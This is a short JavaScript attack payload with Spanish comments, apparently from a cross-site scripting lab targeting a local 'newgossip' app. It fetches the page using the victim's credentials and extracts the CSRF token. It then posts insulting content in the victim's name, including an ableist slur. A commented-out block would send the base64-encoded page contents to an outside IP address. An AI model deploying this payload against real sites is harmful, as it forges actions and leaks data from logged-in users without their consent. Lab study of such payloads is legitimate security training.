var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
// Aqui el false hace referencia a una peticion sicrona, en caso true -> seria asincrona
req1.open('GET', domain, false);
//enviamos la solicitud
req1.withCredentials = true;
req1.send();
//almacenamos la respuesta
var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data = "title=Mi%20jefe%20es%20imbecil&subtitle=Mi%20jefe%20es%20tonto&text=Mi%20jefe%20es%20retrasado&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip' , false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
//var req2 = new XMLHttpRequest();
//btoa convierte la solicitud que se tramita de html a base64 y a toda esa cadena la podemos decodear para ver la respuesta en texto claro
//req2.open('GET', 'http://192.168.1.187/?response=' + btoa(response));
//req2.send();
